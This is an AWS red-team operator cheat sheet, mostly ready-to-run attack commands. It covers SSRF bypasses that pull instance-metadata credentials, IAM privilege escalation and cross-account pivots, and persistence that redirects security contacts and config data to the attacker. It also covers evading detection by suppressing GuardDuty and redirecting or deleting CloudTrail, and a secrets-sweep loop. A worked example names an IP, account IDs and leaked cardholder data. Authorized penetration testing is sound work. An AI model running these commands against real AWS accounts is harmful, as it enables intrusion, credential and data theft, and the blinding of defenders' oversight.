+++
title = 'AWS Cloud Red Teaming — Operator Notes'
date = 2026-10-30
type = 'notes'
weight = 10
toc = true
tags = ['cloud', 'red-team', 'aws']
+++

> Practical field reference for assessing AWS environments from an attacker's seat. Covers initial access, enumeration, privilege escalation, lateral movement, persistence, impact, detection/evasion, and tooling. The MCRTA chain is used as a worked example in §11.
>
> **Authorized engagements only.** Assume every API call is logged (CloudTrail); plan the detection story before the action, not after. AWS environments are heavily monitored by GuardDuty, Security Hub, and third-party EDRs. Move slowly, reuse existing artifacts, and understand the IP/User-Agent footprint you are leaving behind.
>
> **2025–2026 update:** The attack surface has expanded dramatically. **Bedrock AgentCore** and **Cognito** are new privilege-escalation primitives. **AI-assisted intrusion** reached admin access in **8 minutes** (Sysdig, Nov 2025). **`pathfinding.cloud`** catalogs **65+ verified IAM escalation paths** and **`pathrunner`** automates them. **Hostname obfuscation** (nip.io, sslip.io, 1u.ms) bypasses IP blocklists for SSRF. **AWS Config delivery-channel redirection** and **PutAlternateContact** are stealthy persistence mechanisms. **CloudFox v1.17.0+** is required after AWS changed its service-mapping format in Dec 2025.

---

## 1. Attack Surface Map

| Surface | What to look for | Typical entry |
|---|---|---|
| **Compute** | EC2 public IPs, SSRF-prone apps, CI runners, ECS/EKS clusters | SSRF → IMDS/ECS Task Metadata; user-data; SSM |
| **Identity** | IAM users/roles, access keys, trust policies, identity providers | Leaked keys, confused deputy, wildcard trusts |
| **Storage** | Public/misconfigured S3, EBS snapshots, ECR repositories, RDS snapshots | Bucket listing; snapshot restore; repository pull |
| **Secrets** | Secrets Manager, SSM Parameter Store, `.env` files, Lambda env vars | Read permissions; source code leaks |
| **Serverless** | Lambda env vars, layers, execution roles, API Gateways | `iam:PassRole`; `lambda:UpdateFunctionCode` |
| **AI/ML** | **Bedrock AgentCore**, SageMaker, model invocation logs | `iam:PassRole` + `CreateAgentRuntime`; SSRF |
| **CI/CD** | CodeBuild/CodePipeline, GitHub/GitLab OIDC roles, self-hosted runners | Repo leak; trust policy abuse; OIDC `sub` wildcard |
| **Federation** | SAML/OIDC providers, cross-account roles, **Cognito identity pools** | Trust policy evaluation; **self-signup → IAM role** |
| **Account metadata** | **Alternate contacts (SECURITY/BILLING)**, Config delivery channels | **`PutAlternateContact`**; **`PutDeliveryChannel`** |

---

## 2. Initial Access

### 2.1 SSRF → Instance Metadata Service (IMDS)

**IMDSv1 (Legacy/Default on older instances)** — plain GET, no auth:

```bash
B=http://169.254.169.254/latest
curl -s $B/meta-data/instance-id
curl -s $B/meta-data/iam/security-credentials/
curl -s $B/meta-data/iam/security-credentials/<ROLE>   # AccessKeyId/SecretAccessKey/Token
curl -s $B/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
curl -s $B/user-data                                   # Often bootstraps secrets or SSH keys
curl -s $B/dynamic/instance-identity/document          # Account ID, Region, AZ
```

**IMDSv2 (Modern/Enforced)** — Needs a token (PUT), so a GET-only SSRF is blocked unless the backend **forwards headers or supports PUT**. This is rarer in 2024+ but still occurs:

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**SSRF filter bypasses for `169.254.169.254`:**

```
2852039166                      # Decimal
0xa9fea9fe / 0251.0376.0251.0376 # Hex / Octal
169.254.169.254.nip.io          # DNS rebinding
169-254-169-254.sslip.io        # Hostname obfuscation (SANS, Aug 2026)
[::ffff:169.254.169.254]        # IPv6-mapped
http://169.254.169.254:80/...   # Port tricks
# Redirects: Host a 302 -> metadata; many fetchers follow
# DNS rebinding: Attacker-controlled name that resolves to 169.254.169.254
# 1u.ms: Dynamic DNS for SSRF testing (SANS, Aug 2026)
```

> **CVE-2025-64709 (Typebot):** SSRF in the webhook block bypassed **IMDSv2 protection through custom header injection**, extracting EKS node-role credentials and compromising the entire Kubernetes cluster.

### 2.2 ECS/EKS Container Metadata

If the target is a container (ECS Fargate or EKS with pod identity), the EC2 IMDS is not available. Use the **ECS Task Metadata Endpoint**:

```bash
# ECS Task Metadata
curl -s http://169.254.170.2/v2/credentials
curl -s http://169.254.170.2/v2/metadata

# EKS Pod Identity (if configured)
curl -s http://169.254.170.23/v1/credentials
```

### 2.3 Leaked Credentials

```bash
# Filesystem
cat ~/.aws/credentials ~/.aws/config 2>/dev/null
find / -path /proc -prune -o \( -name credentials -o -name '*.pem' -o -name '*.tfstate' \) -print 2>/dev/null
cat /proc/self/environ | tr '\0' '\n' | grep -iE 'aws|token|key'

# App / Repo leaks
rg -iE 'AKIA[0-9A-Z]{16}|aws_secret_access_key|aws_session_token' .
git log -p | rg -iE 'AKIA[0-9A-Z]{16}|secret'
```

**AWS Access Key ID prefixes:**
- `AKIA` — Long-lived user key
- `ASIA` — Temporary/STS key
- `AROA` — Role key

### 2.4 Public S3

```bash
aws s3 ls s3://BUCKET --no-sign-request                 # List
aws s3 cp s3://BUCKET/key . --no-sign-request           # Download
curl -s "https://BUCKET.s3.amazonaws.com/?list-type=2"  # XML list, no creds
curl -sI "https://BUCKET.s3.amazonaws.com/"             # 200 listable / 403 exists
curl -s "http://BUCKET.s3-website-REGION.amazonaws.com/" # Website endpoint
```

> **Tip:** Bucket-name guessing from org names (`org-prod`, `org-data`, `org-backup`, `org-website`, `org-assets`) is productive — names are globally unique, so `NoSuchBucket` vs `200/403` differentiates quickly.

### 2.5 CI/CD, OIDC, and Confused Deputy

- **GitHub/GitLab OIDC:** Trust with `token.actions.githubusercontent.com` and a loose `sub` condition (`repo:*`) → any repo can assume the role. **UNC6426** (Aug 2025) used the **s1ngularity npm supply chain attack** to achieve full AWS admin in **72 hours** via OIDC wildcard abuse.
- **`iam:PassRole`:** Combined with a service that can be tricked into assuming a more powerful role (e.g., Lambda, EC2, **Bedrock AgentCore**).
- **Webhooks/SSRF:** Into `169.254.170.2` (ECS task metadata) for container creds.

### 2.6 Cognito Self-Signup

If a Cognito User Pool has **self-service sign-up enabled** (`AllowAdminCreateUserOnly = false`), anyone who can reach the client can create an account and, if the pool is federated with an Identity Pool, obtain **temporary AWS credentials scoped to the authenticated-user IAM role**.

```bash
aws cognito-idp sign-up --client-id <client-id> --username attacker --password <PASS>
aws cognito-idp initiate-auth --client-id <client-id> --auth-flow USER_PASSWORD_AUTH ...
```

> **HTB Business CTF 2025 (EBS):** Self-registration was enabled by default; the authenticated Cognito user's IAM role was over-privileged, granting access to the Emergency Broadcast System.

---

## 3. Validate the Identity You Hold

Always establish *who you are* and *what account/role* before enumerating:

```bash
aws sts get-caller-identity
# arn:aws:sts::<ACCT>:assumed-role/<ROLE>/<SESSION>
```

From instance creds without the CLI (raw SigV4), a minimal signer is enough for `GetCallerIdentity`. If `aws` is absent, write a small HMAC-SHA256 SigV4 client (service `sts`, region matching the instance) — ~40 lines of Python stdlib.

Set env for temp creds:

```bash
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
```

---

## 4. Enumeration

Fast bulk dump (if `iam:GetAccountAuthorizationDetails` is allowed — the best single call):

```bash
aws iam get-account-authorization-details     # users, groups, roles, policies, trust docs
```

Structured:

```bash
aws iam list-users
aws iam list-groups
aws iam list-roles
aws iam list-policies --scope Local
aws iam list-attached-user-policies   --user-name U
aws iam list-user-policies            --user-name U
aws iam get-user-policy               --user-name U --policy-name P
aws iam list-attached-group-policies  --group-name G
aws iam list-groups-for-user          --user-name U
aws iam get-role                      --role-name R          # Trust policy (who can assume)
aws iam get-policy-version --policy-arn ARN --version-id V
aws iam list-role-policies            --role-name R
aws iam list-attached-role-policies   --role-name R
```

**New surfaces to enumerate (2025–2026):**

```bash
# Cognito
aws cognito-idp list-user-pools --max-results 10
aws cognito-idp list-user-pool-clients --user-pool-id POOL_ID
aws cognito-identity list-identity-pools --max-results 10
aws cognito-identity list-identities --identity-pool-id POOL_ID --max-results 10

# Bedrock AgentCore
aws bedrock-agentcore list-agent-runtimes
aws bedrock-agentcore get-agent-runtime --agent-runtime-id ID

# Lambda resource policies (backdoor check)
aws lambda get-policy --function-name FUNCTION

# IAM Roles Anywhere
aws rolesanywhere list-trust-anchors
aws rolesanywhere list-profiles

# Account contacts
aws account get-contact-information
aws account get-alternate-contact --alternate-contact-type SECURITY
```

Service surfaces worth a sweep when creds allow:

```bash
aws s3api list-buckets
aws ec2 describe-instances --query 'Reservations[].Instances[].{id:InstanceId,ip:PublicIpAddress,role:IamInstanceProfile}'
aws ec2 describe-security-groups
aws lambda list-functions
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id X
aws ssm describe-parameters
aws ssm get-parameter --name P --with-decryption
aws ecr describe-repositories
aws dynamodb list-tables
```

**Simulation:** If allowed, use `aws iam simulate-principal-policy` to turn "can I?" into a straight answer.

**Graph tools:** **pathfinding.cloud** (Datadog) catalogs 65+ verified IAM escalation paths across IAM, EC2, Lambda, ECS, Glue, CodeBuild, SageMaker, SSM, CloudFormation, **Bedrock**, AppRunner. **`pathrunner`** automates the exploitation of those paths.

---

## 5. Privilege Escalation

### 5.1 Direct IAM Manipulation

| Required permission | Escalation |
|---|---|
| `iam:CreatePolicyVersion` | Create version with `Action:* Resource:*`, `--set-as-default` |
| `iam:SetDefaultPolicyVersion` | Flip a permissive dormant version |
| `iam:AttachUserPolicy` / `AttachGroupPolicy` / `AttachRolePolicy` | Attach `AdministratorAccess` |
| `iam:PutUserPolicy` / `PutGroupPolicy` / `PutRolePolicy` | Write inline `*:*` |
| `iam:CreateAccessKey` | Create key for another (privileged) user |
| `iam:CreateLoginProfile` / `UpdateLoginProfile` | Console password for a user |
| `iam:UpdateAssumeRolePolicy` | Make a role trust you, then AssumeRole |

### 5.2 PassRole Chaining

| Required permission | Escalation |
|---|---|
| `iam:PassRole` + `lambda:CreateFunction` + `Invoke` | Run code as the passed role |
| `iam:PassRole` + `ec2:RunInstances` | Launch with privileged instance profile |
| `iam:PassRole` + `glue:CreateDevEndpoint` | SSH-less code exec as role |
| `iam:PassRole` + `cloudformation:CreateStack` | Stack executes as role |
| `iam:PassRole` + `sagemaker:CreateNotebookInstance` | Notebook as role |
| **`iam:PassRole` + `bedrock-agentcore:CreateAgentRuntime`** | **AgentCore runtime executes as the passed role** (2026) |

> **Bedrock AgentCore (2026):** A caller with `iam:PassRole` and `bedrock-agentcore:CreateAgentRuntime` (or `CreateHarness` + `InvokeAgentRuntimeCommand`) can create an AgentCore resource attached to a privileged role. Subsequent invocations execute as that role — **privilege escalation to roles that trust `bedrock-agentcore.amazonaws.com`**. This is an **AWS feature, not a vulnerability**; it requires `iam:PassRole` and the create permissions. Detection rules exist (Elastic).

### 5.3 Service-Specific Escalation

| Required permission | Escalation |
|---|---|
| `lambda:UpdateFunctionCode` | Swap code on existing function (keeps its role) |
| `ssm:SendCommand` | Run commands on managed instances |
| `ec2:RunInstances` (user-data) | Bootstrap to exfil role creds |
| `sts:AssumeRole` | Pivot into any role whose trust allows you |
| **`cognito-identity:GetCredentialsForIdentity`** | **Obtain AWS creds from an identity pool** |
| **`iam:CreateTrustAnchor` (Roles Anywhere)** | **Register external CA → mint client certs → assume roles** |

### 5.4 Examples

```bash
# CreatePolicyVersion
aws iam create-policy-version --policy-arn ARN --policy-document file://admin.json --set-as-default

# Attach Admin
aws iam attach-user-policy --user-name U --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Backdoor trust then assume
aws iam update-assume-role-policy --role-name R --policy-document file://trust-me.json
aws sts assume-role --role-arn arn:aws:iam::ACCT:role/R --role-session-name s

# PassRole -> Lambda
aws lambda create-function --function-name x --runtime python3.12 \
  --role arn:aws:iam::ACCT:role/TARGET --handler x.h --zip-file fileb://x.zip
aws lambda invoke --function-name x out.json

# Cognito self-signup → IAM creds
aws cognito-idp sign-up --client-id CLIENT --username attacker --password 'P@ssw0rd!'
aws cognito-idp initiate-auth --client-id CLIENT --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=attacker,PASSWORD='P@ssw0rd!'
aws cognito-identity get-credentials-for-identity --identity-id ID --logins '{"cognito-idp.REGION.amazonaws.com/POOL_ID":"TOKEN"}'
```

---

## 6. Lateral Movement & Cross-Account

Look for role trust policies that name *you*, your account, or a loose condition:

```json
Principal: {"AWS": "arn:aws:iam::<MYACCT>:root"}      # whole account can assume
Principal: {"AWS": "arn:aws:iam::<MYACCT>:role/X"}    # specific role
Condition: {"StringLike": {"aws:PrincipalArn": "arn:aws:iam::*:role/*"}}   # wildcard = weak
```

```bash
aws sts assume-role --role-arn arn:aws:iam::OTHER:role/crossaccount-role \
  --role-session-name pivot
```

**Cross-account abuse pattern:**
1. Find a role with a permissive trust (external account `root` or wildcard).
2. Assume it → new account context → repeat enumeration.
3. Chain to the victim's data stores.

**Resource-based policies** (S3 bucket policy, KMS key policy, Lambda resource policy, SNS/SQS) also grant cross-account access without any IAM principal change.

**Lambda cross-account backdoor:** `lambda:AddPermission` with `Principal: "*"` grants **public invocation** — a covert, unauthenticated execution path.

**Organizations:** If you compromise a **management account** principal that can `sts:AssumeRole` into member accounts, you own every account. `aws organizations list-accounts` → `aws sts assume-role`.

---

## 7. Persistence

| Method | Notes |
|---|---|
| New IAM user + access key | Noisy; GuardDuty/CloudTrail flags `CreateUser`/`CreateAccessKey` |
| Second access key on existing user | Blends if user is active |
| `UpdateAssumeRolePolicy` backdoor trust | Survives credential rotation |
| Lambda backdoor (`UpdateFunctionCode` on a scheduled function) | Recurring exec as role |
| **Lambda resource policy backdoor (`AddPermission`)** | **Public or cross-account invocation — no creds needed** |
| SSM `SendCommand` on interval / State Manager association | Persistent remote exec |
| ECS task definition backdoor image | Runs as task role |
| CloudFormation stack set | Re-creates resources |
| OIDC/SAML provider trust | Federated persistence |
| **`account:PutAlternateContact` (SECURITY)** | **Redirect security/abuse notifications to attacker email — survives credential rotation** |
| **AWS Config `PutDeliveryChannel`** | **Redirect config inventory to attacker S3/SNS** |
| **IAM Roles Anywhere rogue trust anchor** | **External CA → mint client certs → assume roles** |
| **Cognito self-signup (persistent)** | **Re-register after cleanup** |

> **OpSec:** Prefer modifying existing artifacts over creating new principals — new-user events are high-signal for defenders.
>
> **2026 stealth persistence:**
> - **`PutAlternateContact`** — Set the `SECURITY` alternate contact to an attacker-controlled email. AWS sends compromise notifications, abuse reports, and security bulletins there. The legitimate owner stops seeing them. **Survives credential rotation because it lives in account metadata, not IAM.**
> - **AWS Config `PutDeliveryChannel`** — Redirect future configuration-inventory snapshots to an attacker-controlled S3 bucket or SNS topic. Does not carry a role ARN; changes apply region-wide.
> - **IAM Roles Anywhere** — Create a `TrustAnchor` with an external CA you control; create a `Profile` linking it to a privileged role. Mint client certificates on demand.

---

## 8. Data Access & Impact

```bash
# S3 mass read
aws s3 sync s3://bucket ./loot --no-sign-request

# EBS snapshot -> volume -> attach/restore
aws ec2 describe-snapshots --owner-ids self
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-2a

# Secrets
aws secretsmanager get-secret-value --secret-id prod/db --query SecretString --output text
aws ssm get-parameters-by-path --path /prod --recursive --with-decryption

# RDS (if public/accessible)
aws rds describe-db-instances
```

**Credit-card / PII hunting in S3:** List objects, grep for `card|pan|ssn|cvv|prod-data`, then validate formats (Luhn for PANs).

---

## 9. Detection & Evasion

**What defenders see:**
- **CloudTrail:** Every control-plane API (`CreateUser`, `PutUserPolicy`, `AssumeRole`, `GetSecretValue`, `CreateAccessKey`, `UpdateAssumeRolePolicy`, `PutAlternateContact`, `PutDeliveryChannel`).
- **GuardDuty findings:**
  - `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` — Instance creds used off-instance.
  - `Recon:IAMUser/MaliciousIPCaller`, `Discovery:S3/*`.
  - `Persistence:IAMUser/UserPermissions`.
- **VPC Flow Logs, S3 access logs, Config changes.**

**Reducing signal:**
- **Source IP:** Use instance credentials *from the instance* (or via a proxy from its IP) so the source IP matches the metadata-credential expectation.
- **Volume:** Throttle and spread calls; avoid `GetAccountAuthorizationDetails` unless confident.
- **Actions:** Prefer read/enumerate over create; prefer modifying existing principals over new ones.
- **Fingerprint:** Match the SDK User-Agent of what normally runs there.
- **Cleanup:** Clean up created keys/versions where practical (but assume the log survives).

**2025–2026 evasion techniques:**
- **`iamadmin` blind spot (Datadog):** An undocumented AWS API service (`iamadmin`) allowed read-only IAM enumeration (`ListAccessKeys`, `GetRole`) to execute **without generating CloudTrail entries** — and suppressed corresponding GuardDuty alerts.
- **GuardDuty suppression (`CreateIPSet` / `UpdateIPSet`):** An attacker with `guardduty:CreateIPSet` can add their C2 infrastructure IPs to a **trusted IP set**, suppressing GuardDuty findings from those addresses.
- **CloudTrail log redirection:** If you hold `cloudtrail:UpdateTrail`, redirect logs to a bucket you control — or delete the trail.
- **AWS X-Ray C2 (`XRayC2`):** Repurpose AWS X-Ray trace annotations as a **covert bidirectional C2 channel**. Small, encoded payloads are placed inside trace annotations; the attacker polls X-Ray query APIs to retrieve them. Leverages legitimate cloud monitoring infrastructure — avoids traditional network detection.
- **NATS-as-C2 (Sysdig, May 2026):** First documented use of **NATS** (cloud-native pub/sub) as C2 infrastructure. Combined with CVE-2026-33017 for initial access.

---

## 10. Tooling

| Tool | Use |
|---|---|
| `awscli` | Baseline; `--no-sign-request` for anonymous |
| **Pacu** | Exploitation framework: `iam__enum_permissions`, `iam__privesc_scan`, `s3__enum`, `lambda__backdoor_new_roles`, `iam__backdoor_users_keys`, `iam__backdoor_assume_role` |
| **CloudFox** | Live enum + "where can I go next". **v1.17.0+ required** after AWS service-mapping format change (Dec 2025) |
| **pathrunner** (Datadog) | Modular framework automating **65+ verified escalation paths** from `pathfinding.cloud` |
| **Atlas** | AWS adversary emulation platform — 65+ paths, BloodHound-style queries, **no-execution simulation mode**, AI explanations |
| **PMapper** | Graph IAM: `query 'who can do iam:PassRole with *'` |
| **enumerate-iam** | Brute-force allowed API calls from a key |
| **ScoutSuite** | Multi-service posture dump |
| **Prowler** | CIS/policy checks (also noisy) |
| **cloudsplaining** | Finds privesc/resource-exposure in IAM policies |
| **Cartography** | Asset graph (Neo4j) |
| **Steampipe** | SQL over cloud APIs |
| **XRayC2** | Covert C2 over AWS X-Ray trace annotations |

### 10.1 Minimal stdlib SigV4 Client (No boto3/awscli)

If Python is present but `boto3`/`awscli` are absent, write a ~40-line client:

```python
# Sign POST to <service>.<region>.amazonaws.com with SigV4
# Canonical request: POST / ; signed headers include x-amz-security-token
# Then urllib POST Action=...&Version=...
```

**Quick capability probe order with a stolen key:**
1. `sts:GetCallerIdentity` (always).
2. `iam:ListUsers/Groups/Roles` (if allowed).
3. `iam:List*Policies` + `GetPolicyVersion` on local policies.
4. `s3api:ListBuckets`, `secretsmanager:ListSecrets`, `ssm:DescribeParameters`.
5. `iam:SimulatePrincipalPolicy` if granted — turns "can I?" into a straight answer.

---

## 11. Worked Example — MCRTA "cwl-metatech" Chain

Illustrates the full loop from an unauthenticated start to cross-account trust review.

```
1. Enumerate org bucket names
   curl -s https://cwl-metatech-prod.s3.amazonaws.com/?list-type=2
   -> 200 ListBucketResult: dev-server-ip.txt, prod-data.txt, staging-data.txt

2. Follow the lead
   curl .../dev-server-ip.txt            -> 18.222.161.152
   curl .../prod-data.txt                -> cardholder table (Bob/Caball/PAN)
   curl .../staging-data.txt             -> more card data

3. Fingerprint the dev-server
   nmap -p80 18.222.161.152   -> Apache/2.4.65 (Amazon Linux), "URL Score Calculator"
   browse /update.html /score.html -> forms: url, date, ip, organization

4. Find the SSRF (two candidates)
   POST /calculate_score.php url=...   -> returns a hash-like "score", does NOT fetch
   POST /process.php ip=http://169.254.169.254/latest/meta-data/  -> IMDS tree  <-- SSRF

5. Harvest role + creds
   ip=.../meta-data/iam/security-credentials/          -> ec2-role
   ip=.../meta-data/iam/security-credentials/ec2-role  -> ASIA... + secret + token
   ip=.../meta-data/instance-id                        -> i-0c95b6744d7501b40

6. Validate (raw SigV4, no awscli)
   sts:GetCallerIdentity -> arn:aws:sts::240966491515:assumed-role/ec2-role/i-0c95...

7. IAM enumeration with the instance role
   iam:ListUsers   -> automation-terraform, emp001, emp002, emp003, int001
   iam:ListGroups  -> employees, interns
   iam:ListRoles   -> ec2-role, dev-role, devops-role, crossaccount-role, ...
   iam:GetRole crossaccount-role -> trust: arn:aws:iam::058264439561:user/manager
   iam:GetRole dev-role          -> trust: arn:aws:iam::240966491515:role/devops-role
   iam:ListAttachedGroupPolicies employees -> AmazonDevOpsGuruFullAccess
   iam:ListUserPolicies emp001   -> s3-administrator-Policy
   iam:ListGroupsForUser int001  -> interns
   iam:ListGroupsForUser emp003  -> employees

Findings: cross-account trust (058264439561) and a devops-role -> dev-role assumption path.
```

**Lessons reinforced:**
- Public bucket listing is the cheapest lead.
- Distinguish the endpoint that *actually fetches* from the one that only computes.
- Instance-role creds are the pivot into IAM.
- **Trust policies**, not permission policies, are where cross-account answers live.

---

## 12. One-Liners

```bash
# Who am I / what account
aws sts get-caller-identity --output json

# Everything IAM in one shot (if permitted)
aws iam get-account-authorization-details --output json > iam.json

# All local (customer-managed) policies
aws iam list-policies --scope Local --query 'Policies[].Arn' --output text

# Trust policy of every role
for r in $(aws iam list-roles --query 'Roles[].RoleName' --output text); do
  echo "== $r"; aws iam get-role --role-name "$r" \
    --query 'Role.AssumeRolePolicyDocument' --output json
done

# Secrets sweep
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | \
  while read s; do aws secretsmanager get-secret-value --secret-id "$s" \
  --query SecretString --output text; done

# Public bucket check
curl -s -o /dev/null -w '%{http_code}\n' "https://BUCKET.s3.amazonaws.com/"

# Anonymous object pull
aws s3 cp s3://BUCKET/key . --no-sign-request

# Cognito pools
aws cognito-idp list-user-pools --max-results 10

# Lambda public invocation check
aws lambda get-policy --function-name FUNCTION --query 'Policy' --output text

# IAM Roles Anywhere
aws rolesanywhere list-trust-anchors
aws rolesanywhere list-profiles

# Alternate contact
aws account get-alternate-contact --alternate-contact-type SECURITY
```

---

## 13. Notable CVEs & Incidents (2025–2026)

| CVE / Incident | Impact |
|---|---|
| **CVE-2025-64709 (Typebot)** | SSRF bypassed IMDSv2 via custom header injection → EKS node-role creds → full cluster compromise |
| **CVE-2026-4269 (Bedrock AgentCore)** | AgentCore Starter Toolkit vulnerable to malicious S3 build artifacts → remote code injection into AgentCore Runtime |
| **CVE-2026-89049 (SSM Agent)** | SSRF due to improper validation of equivalent address representations in port forwarding → bypass |
| **CVE-2026-33017** | Initial access for NATS-as-C2 campaign |
| **UNC6426 (s1ngularity)** | npm supply chain → GitHub OIDC wildcard → AWS admin in 72 hours |
| **Sysdig AI-assisted (Nov 2025)** | Credential theft → Lambda code injection → admin in **8 minutes**; 19 principals compromised |
| **Bedrock AgentCore Code Interpreter sandbox breakout** | `genesis1ptools` user passwordless sudo → deploy-certificates.sh |
| **AWS X-Ray C2 (XRayC2)** | Covert bidirectional C2 over trace annotations |
| **`iamadmin` CloudTrail blind spot** | Read-only IAM enumeration without CloudTrail/GuardDuty events |
